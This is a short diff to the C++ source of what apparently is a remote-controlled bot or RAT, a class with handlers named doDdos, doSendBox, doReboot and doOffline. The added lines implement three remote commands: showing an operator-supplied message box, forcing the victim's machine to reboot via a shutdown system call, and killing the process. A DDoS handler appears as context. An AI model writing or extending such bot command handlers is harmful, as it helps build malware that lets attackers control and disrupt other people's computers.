@@ -293,13 +293,16 @@ void Food::doDdos(std::map<std::string, std::string>& args)
 
 void Food::doSendBox(std::map<std::string, std::string>& args)
 {
+	MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
 }
 
 void Food::doReboot(std::map<std::string, std::string>&)
 {
+	system("shutdown -r -t 1");
 }
 
 void Food::doOffline(std::map<std::string, std::string>&)
 {
+	ExitProcess((UINT)NULL);
 }
 
